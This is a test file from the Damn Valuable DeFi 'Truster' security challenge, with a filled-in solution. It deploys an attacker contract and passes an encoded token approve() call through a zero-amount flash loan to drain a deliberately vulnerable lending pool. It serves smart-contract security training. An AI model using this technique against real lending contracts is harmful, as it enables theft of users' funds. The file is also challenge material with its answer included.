const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Truster", function () {
  let deployer, attacker;

  const TOKENS_IN_POOL = ethers.utils.parseEther("1000000");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const DamnValuableToken = await ethers.getContractFactory(
      "DamnValuableToken",
      deployer
    );
    const TrusterLenderPool = await ethers.getContractFactory(
      "TrusterLenderPool",
      deployer
    );

    this.token = await DamnValuableToken.deploy();
    this.pool = await TrusterLenderPool.deploy(this.token.address);

    await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

    expect(await this.token.balanceOf(this.pool.address)).to.equal(
      TOKENS_IN_POOL
    );

    expect(await this.token.balanceOf(attacker.address)).to.equal("0");
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE  */
    const AttackTrustDeployer = await ethers.getContractFactory(
      "AttackTruster",
      attacker
    );
    const AttackTrusterContract = await AttackTrustDeployer.deploy(
      this.pool.address,
      this.token.address
    );

    const amount = 0;
    const borrower = attacker.address;
    const target = this.token.address;

    // Get data

    const abi = ["function approve(address sender, uint256 amount)"];
    const iface = new ethers.utils.Interface(abi);
    const data = iface.encodeFunctionData("approve", [
      AttackTrusterContract.address,
      TOKENS_IN_POOL,
    ]);

    await AttackTrusterContract.attack(amount, borrower, target, data);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker has taken all tokens from the pool
    expect(await this.token.balanceOf(attacker.address)).to.equal(
      TOKENS_IN_POOL
    );
    expect(await this.token.balanceOf(this.pool.address)).to.equal("0");
  });
});
